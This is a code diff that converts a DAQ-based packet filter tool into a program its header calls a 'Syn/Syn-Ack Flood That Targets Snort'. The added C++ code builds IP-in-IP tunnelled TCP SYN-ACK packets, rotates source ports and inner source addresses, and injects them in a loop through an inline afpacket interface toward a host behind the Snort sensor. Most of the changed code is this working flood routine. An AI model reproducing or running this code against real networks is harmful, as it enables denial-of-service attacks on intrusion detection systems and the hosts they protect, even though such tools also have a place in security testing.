@@ -1,3 +1,10 @@
+/*
+ * Copyright (c) Victor Roemer, 2013. All rights reserved.
+ * Feb 24 2013
+ * Syn/Syn-Ack Flood That Targets Snort
+ *
+ */
+
 // DAQ Global - vjr
 #include <sys/un.h>
 #ifndef _GNU_SOURCE
@@ -22,6 +29,160 @@
 #include <pcap.h>
 
 
+#include <cstdio>
+#include <cstdlib>
+#include <cstdint>
+#include <cstring>
+#include <ctime>
+#include <cerrno>
+
+#include <unistd.h>
+#include <getopt.h>
+
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netinet/ether.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+#include <net/ethernet.h>
+#include <netinet/if_ether.h>
+
+extern "C" int ip_checksum ( void *, size_t );
+
+/***************************************************************************
+ *                            Packet Data Type                             *
+ ***************************************************************************/
+
+#define MY_IP_VERS  4
+#define MY_IP_HLEN  5
+#define MY_IP_TTL   64
+
+#define START_PORT  1024
+
+#define PKTBUFSIZ 1472
+#define FIXEDSIZE \
+    (sizeof(struct ether_header)+sizeof(struct ip)*2+sizeof(struct tcphdr))
+
+struct PacketTemplate {
+    struct ether_header eth;
+    struct ip           ip;
+    struct ip           ip2;
+    struct tcphdr       tcp;
+    unsigned char       payload[(PKTBUFSIZ - FIXEDSIZE)]; 
+} __attribute__((__packed__));
+
+
+/***************************************************************************
+ *                             Runtime Options                             *
+ ***************************************************************************/
+
+static unsigned opt__egress_id;
+static const char *opt__ifr_name;
+static const char *opt__src_ipaddr;
+static const char *opt__dst_ipaddr;
+static const char *opt__dst_hwaddr;
+static const char *opt__src_hwaddr;
+static unsigned   opt__loop_count;
+
+static const char * const shortopts = "he:i:s:d:S:D:l:";
+static struct option longopts[] =
+{
+    { "help", no_argument, NULL, 'h' },
+    { "dev", required_argument, NULL, 'e' },
+    { "intf", required_argument, NULL, 'i' },
+    { "src-ip", required_argument, NULL, 's' },
+    { "dst-ip", required_argument, NULL, 'd' },
+    { "dst-mac", required_argument, NULL, 'D' },
+    { "src-mac", required_argument, NULL, 'S' },
+    { "loop", required_argument, NULL, 'l' },
+    { NULL, 0, NULL, 0 }
+};
+
+static void display_usage ( void )
+{
+    fprintf(stdout,
+      "Usage: syn_ack_flood --intf <dev> -D <mac> --src-ip <ip> --dst-ip <ip>\n\n");
+}
+
+static void display_help ( void )
+{
+    display_usage();
+    fprintf(stdout,
+      "  Options:\n"
+      "\t-e <dev_id>, --dev <id>        Device index to send packets to\n"
+      "\t-i <dev>, --intf <dev>         Device to send packets from\n"
+      "\t-D <mac>, --dst-mac <mac>      HW address of your default gw\n"
+      "\t-s <ip>, --src-ip <ip>         Starting source address\n"
+      "\t-d <ip>, --dst-ip <ip>         Destination address (A box behind Snort)\n"
+      "\t-l <cnt>, --loop <cnt>         Number of packets to send\n"
+      "\n"
+      "  Misc Options:\n"
+      "\t-h, --help                     Display this help\n"
+      "\n"
+    );
+}
+
+static int do_args ( int argc, char *argv[] )
+{
+    int argi, ch;
+    while ( (ch = getopt_long(argc, argv, shortopts, longopts, &argi)) != -1)
+    {
+        switch ( ch )
+        {
+            case 'e':
+                opt__egress_id = atoi(optarg);
+                break;
+
+            case 'i':
+                opt__ifr_name = optarg;
+                break;
+
+            case 's':
+                opt__src_ipaddr = optarg;
+                break;
+
+            case 'd':
+                opt__dst_ipaddr = optarg;
+                break;
+
+            case 'D':
+                opt__dst_hwaddr = optarg;
+                break;
+
+            case 'S':
+                opt__src_hwaddr = optarg;
+                break;
+
+            case 'l':
+                opt__loop_count = atoi(optarg);
+                break;
+
+            case 'h':
+                display_help();
+                exit(0);
+                break;
+
+            default:
+                fprintf(stdout,
+                  "Try `syn_ack_attack --help' for more information.\n\n");
+                exit(1);
+        }
+    }
+
+    /* Required arguments */
+    if ( !opt__ifr_name || !opt__dst_hwaddr || !opt__dst_ipaddr ||
+         !opt__src_ipaddr )
+    {
+        fprintf(stderr, "Missing required arguements!\n");
+        display_usage();
+        exit(1);
+    }
+
+    return 0;
+}
+
 #define TXT_FG_RED(str)   "\e[31m" str "\e[0m"
 #define TXT_FG_GREEN(str)   "\e[32m" str "\e[0m"
 #define TXT_FG_ORANGE(str)   "\e[33m" str "\e[0m"
@@ -32,7 +193,7 @@
 
 /* DLT_RAW
  *
- * Mandatory, as the redacted daq only supports L3 delivery.
+ * Mandatory, as the VPP daq only supports L3 delivery.
  *
  * This is used to set the "base protocol" used in libpcap and libpacket
  * features.
@@ -49,7 +210,7 @@
 /* SNAPLEN
  *
  *  The SNAPLEN is the absolulte maximum size packet we support processing.
- *  NOTICE: This value should be defined by redacted as the vlib buffer size.
+ *  NOTICE: This value should be defined by VPP as the vlib buffer size.
  */
 #define SNAPLEN 2048
 
@@ -62,7 +223,7 @@
 
 /* STATIC_MODULES
  *
- *  Enables the support of builtin libdaq_static_redacted.a
+ *  Enables the support of builtin libdaq_static_redacted.la
  *
  * If you're in a pinch and need to build an all-in-one static binary, you can
  * do it, but not using the Makefile. */
@@ -71,6 +232,11 @@
 #define UNUSED(name) name ## _unused __attribute__ ((unused))
 #define IS_SET(test, bits) (((test) & (bits)) == (bits))
 
+#ifndef UNIX_PATH_MAX
+#define UNIX_PATH_MAX (sizeof(((struct sockaddr_un*)NULL)->sun_path))
+#endif
+
+using socketpath_t = char[UNIX_PATH_MAX];
 
 #define ERRBUF_SIZE 256
 using Errbuf = std::array<char, ERRBUF_SIZE>;
@@ -295,6 +461,21 @@ public:
         msgs.recv_count = 0;
     }
 
+    int inject(uint8_t const* data, uint32_t const len)
+    {
+        // XXX Possible to inject arbitrary packet/data back into the subsystem here.
+        // Good option for data-plane data updates (nbar, appid, etc)
+        DAQ_PktHdr_t ph = {};
+        //ph.ingress_index = 1;
+        ph.ingress_index = opt__egress_id;
+        return daq_instance_inject(
+                instance,
+                DAQ_MSG_TYPE_PACKET,
+                &ph,
+                data,
+                len);
+    }
+
     DAQ_Stats_t get_stats() const
     {
         DAQ_Stats_t stats;
@@ -319,11 +500,12 @@ class DataPlaneWorker
     using threadname_t = char[256];
 
 public:
-    DataPlaneWorker(DaqConfig config, unsigned id, std::string filter, DAQ_Verdict verdict, DAQ_Verdict default_verdict)
+    DataPlaneWorker(DaqConfig config, unsigned id, std::string filter, DAQ_Verdict verdict, DAQ_Verdict default_verdict, PacketTemplate& packet)
         : config(config),
           id(id),
           match_verdict(verdict),
-          default_verdict(default_verdict)
+          default_verdict(default_verdict),
+          packet(packet)
     {
         pcap_t *dead = pcap_open_dead(DLT_EN10MB, SNAPLEN);
         if (dead == nullptr)
@@ -337,12 +519,6 @@ public:
 
         pcap_close(dead);
         dead = nullptr;
-
-        //if (pcap_compile_nopcap(SNAPLEN, DLT_EN10MB, &fcode, filter.c_str(), 0, PCAP_NETMASK_UNKNOWN) == -1)
-        //{
-        //    fprintf(stderr, "%s: BPF state machine compilation failed!", __func__);
-        //    abort();
-        //}
 
         int result = bpf_validate(fcode.bf_insns, fcode.bf_len);
         if (result != 1)
@@ -376,6 +552,7 @@ public:
 
     void eval()
     {
+
         DaqInstance in(config);
 
         in.instantiate();
@@ -387,9 +564,14 @@ public:
             auto recv = in.receive_msgs();
 
             if (recv.frame.recv_count > 0) {
+                fprintf(stdout, "[+] Received...\n");
                 print_packets(recv.frame);
             }
 
+            fprintf(stdout, "[+] Attack!\n");
+            attack(in);
+            sleep(1);
+           
             if (recv.status == DAQ_RSTAT_ERROR ||
                 recv.status == DAQ_RSTAT_INVALID) {
                 state = STOP;
@@ -398,6 +580,7 @@ public:
             in.finalize_msgs(verdicts);
 
         } while(state != STOP);
+        fprintf(stdout, "[+] Stop!\n");
 
         in.stop();
     }
@@ -408,6 +591,48 @@ public:
     }
 
 private:
+    void attack(DaqInstance& in)
+    {
+        int i = 0;
+        uint16_t src_port = START_PORT;
+
+        while ( i++ < opt__loop_count )
+        {
+            if ( (i % (65535-START_PORT)) == 0 ) 
+            {
+                /* Increment the Source IP in the tunnel when the port space has
+                 * been exhausted -- reset port to START_PORT */ 
+                uint32_t ip = ntohl(packet.ip2.ip_src.s_addr) + 1;
+                //uint32_t ip = ntohl(packet.ip.ip_src.s_addr) + 1;
+
+                /* Don't let last octet be 0 or 255 */
+                ((ip & 0xFF) == 255) ? ip+=2 :
+                    ((ip % 0xFF) ==   0) ? ip+=1 : 0;
+
+                packet.ip2.ip_src.s_addr = htonl(ip);
+                //packet.ip.ip_src.s_addr = htonl(ip);
+                src_port = START_PORT;
+            }
+            else
+            {
+                /* Each packet has a unique source port. */
+                src_port++;
+            }
+
+
+            uint16_t ip_len = ntohs(packet.ip.ip_len);
+            size_t pktlen = ip_len + sizeof(packet.eth);
+            packet.tcp.th_sport = htons(src_port);
+            packet.tcp.th_dport = htons(80);
+            ip_checksum(&packet.ip, ip_len);
+
+            printf("[" TXT_FG_PURPLE("inject") "] ");
+
+            print_packet(id, nullptr, reinterpret_cast<uint8_t const*>(&packet), pktlen);
+            in.inject(reinterpret_cast<uint8_t const*>(&packet), pktlen);
+        }
+    }
+ 
     bool filter_packet(UNUSED(DAQ_PktHdr_t const* hdr),
             uint8_t const* data,
             uint32_t const size,
@@ -441,16 +666,14 @@ private:
                 uint8_t const * data = daq_msg_get_data(msg);
                 uint32_t const size = daq_msg_get_data_len(msg);
 
-                DAQ_Verdict verdict = default_verdict;
-                bool matched = false;
-                if (filter_packet(hdr, data, size, fcode)) {
-                    verdict = match_verdict;
-                    matched = true;
+                if (!filter_packet(hdr, data, size, fcode)) {
+                    verdicts.verdicts[i] = default_verdict;
+                    continue;
                 }
 
-                verdicts.verdicts[i] = verdict;
-                printf(matched ? "[" TXT_FG_PURPLE("match") "] " : "");
-                printf("[%s] ", str_from_verdict(verdict));
+                verdicts.verdicts[i] = match_verdict;
+                printf("[" TXT_FG_PURPLE("match") "] ");
+                printf("[%s] ", str_from_verdict(match_verdict));
                 print_packet(id, hdr, data, hdr->pktlen);
             }
         }
@@ -467,66 +690,90 @@ private:
 
     DAQ_Verdict match_verdict;
     DAQ_Verdict default_verdict = DAQ_VERDICT_PASS;
+    PacketTemplate packet;
 };
 
-// this is similar to how tcpdump
-static inline std::string
-concat_args(int argc, char const* argv[])
+
+int main (int argc, char const *argv[])
 {
-    std::string result;
-    for (int i = 0; i < argc; ++i)
+    do_args(argc, (char **)argv);
+
+
+    /* Initialize the packet data */
+    fprintf(stdout, "[+] Framming packet template\n");
+    PacketTemplate packet = {};
+
+    /* ETHERNET Frame */
+    packet.eth.ether_type = htons(ETHERTYPE_IP);
+    if ( opt__dst_hwaddr )
     {
-        if (i > 0)
+        struct ether_addr *hw = ether_aton(opt__dst_hwaddr);
+        if ( !hw )
         {
-            result += " ";
+            fprintf(stderr, "[!] Error in destination hw address specified.\n");
+            exit(1);
         }
-        result += argv[i];
+        memcpy(&packet.eth.ether_dhost, hw, sizeof(packet.eth.ether_dhost));
     }
-    return result;
-}
 
-static inline DAQ_Verdict
-verdict_from_str(std::string const& arg)
-{
-    if (arg == "pass")
-        return DAQ_VERDICT_PASS;
+    /* IP Datagram */
+    int ip_len = FIXEDSIZE - sizeof(packet.eth);
 
-    if (arg == "block")
-        return DAQ_VERDICT_BLOCK;
+    packet.ip.ip_v      = MY_IP_VERS;
+    packet.ip.ip_hl     = MY_IP_HLEN;
+    packet.ip.ip_ttl    = MY_IP_TTL;
+    packet.ip.ip_len    = htons(ip_len);
+    packet.ip.ip_p      = IPPROTO_IPIP;
 
-    if (arg == "allowlist" || arg == "whitelist")
-        return DAQ_VERDICT_WHITELIST;
+    if ( inet_pton(AF_INET, opt__src_ipaddr, &packet.ip.ip_src) <= 0 )
+    {
+        fprintf(stderr, "[!] Error in source ip address specified.\n");
+        exit(1);
+    }
 
-    if (arg == "blocklist" || arg == "blacklist")
-        return DAQ_VERDICT_BLACKLIST;
+    if ( inet_pton(AF_INET, opt__dst_ipaddr, &packet.ip.ip_dst) <= 0 )
+    {
+        fprintf(stderr, "[!] Error in destination ip address specified.\n");
+        exit(1);
+    }
 
-    abort();
-    return DAQ_VERDICT_IGNORE;
-}
+    /* IP2 */
+    packet.ip2.ip_v      = MY_IP_VERS;
+    packet.ip2.ip_hl     = MY_IP_HLEN;
+    packet.ip2.ip_ttl    = MY_IP_TTL;
+    packet.ip2.ip_len    = htons(ip_len - (packet.ip.ip_hl << 2));
+    packet.ip2.ip_p      = IPPROTO_TCP;
+    inet_pton(AF_INET, "10.0.0.1", &packet.ip2.ip_src);
+    inet_pton(AF_INET, "10.9.8.7", &packet.ip2.ip_dst);
 
-int main(int argc, char const* argv[])
-{
+    /* TCP Header */
+    packet.tcp.th_off   = 0x5;
+    packet.tcp.th_win   = htons(256);
+    packet.tcp.th_flags = TH_SYN|TH_ACK;
+
+    fprintf(stdout, "[+] Initializing DAQ!\n");
+
     DAQ::load_modules();
     packet_set_datalink(DLT_EN10MB);
 
     DaqVars vars {
         { "debug", "true" },
     };
- 
-    if (argc < 2)
-    {
-        fprintf(stderr, "Usage: dnshog <pcap>\n");
-        exit(1);
-    }
 
     DAQ_Verdict default_verdict = DAQ_VERDICT_PASS;
-    DAQ_Verdict match_verdict = verdict_from_str("pass");
-    std::string filter = "port 53";
+    DAQ_Verdict match_verdict = DAQ_VERDICT_PASS;
+    //std::string filter = concat_args(argc-2, argv+2);
+    std::string filter = "ip and dst host ";
+    filter += opt__src_ipaddr;
+    fprintf(stderr, "Bpf: %s\n", filter.c_str());
 
-    DaqConfig pcap_config("pcap", argv[1], DAQ_MODE_READ_FILE, vars);
-    DataPlaneWorker wk0(pcap_config, 0, filter, match_verdict, default_verdict);
+    DaqConfig afpacket_config("afpacket", opt__ifr_name, DAQ_MODE_INLINE, vars);
+    DataPlaneWorker wk0(afpacket_config, 0, filter, match_verdict, default_verdict, packet);
 
-    sleep(2);
+    bool debugging = true;
+    do {
+        sleep(20);
+    } while (debugging);
 
     wk0.stop();
     wk0.join();
@@ -534,3 +781,4 @@ int main(int argc, char const* argv[])
     DAQ::unload_modules();
     return 0;
 }
+
